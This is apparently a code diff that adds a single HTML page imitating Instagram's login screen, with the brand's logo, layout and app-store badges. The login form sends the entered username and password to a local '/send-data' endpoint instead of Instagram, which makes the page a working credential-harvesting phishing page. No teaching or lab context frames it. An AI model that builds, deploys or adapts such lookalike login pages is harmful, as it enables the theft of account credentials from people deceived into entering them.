@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fafafa;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .phone-preview {
+      display: none;
+    }
+
+    .form-container {
+      width: 350px;
+      padding: 40px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+
+    .form-container img.logo {
+      margin-bottom: 35px;
+      width: 175px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 9px 0 7px 8px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #3897f0;
+      border: none;
+      padding: 8px 0;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-size: 13px;
+      font-weight: bold;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    .forgot-pass {
+      margin-top: 12px;
+      font-size: 11px;
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .signup-container {
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      background: white;
+      margin-top: 10px;
+      padding: 20px;
+      font-size: 14px;
+    }
+
+    .signup-container a {
+      text-decoration: none;
+      color: #3897f0;
+      font-weight: bold;
+    }
+
+    .app-links {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .app-links img {
+      height: 40px;
+      margin: 5px;
+    }
+
+    @media (min-width: 875px) {
+      .container {
+        justify-content: center;
+        align-items: center;
+      }
+
+      .phone-preview {
+        display: block;
+        margin-right: 30px;
+      }
+
+      .phone-preview img {
+        height: 600px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="phone-preview">
+      <img src="https://i.imgur.com/P3Vm1Kq.png" alt="Instagram phone preview" />
+    </div>
+    <div>
+      <div class="form-container">
+        <img class="logo" src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram logo" />
+        <form action="/send-data" method="POST">
+          <input type="text" name="username" placeholder="Phone number, username, or email" required />
+          <input type="password" name="password" placeholder="Password" required />
+          <button type="submit">Log In</button>
+        </form>
+
+        <div class="divider"><span>OR</span></div>
+
+        <div class="facebook-login">Log in with Facebook</div>
+        <a class="forgot-pass" href="#">Forgot password?</a>
+      </div>
+
+      <div class="signup-container">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <div class="app-links">
+        <p>Get the app.</p>
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="App Store" />
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff918d2b.png" alt="Google Play" />
+      </div>
+    </div>
+  </div>
+</body>
+</html>
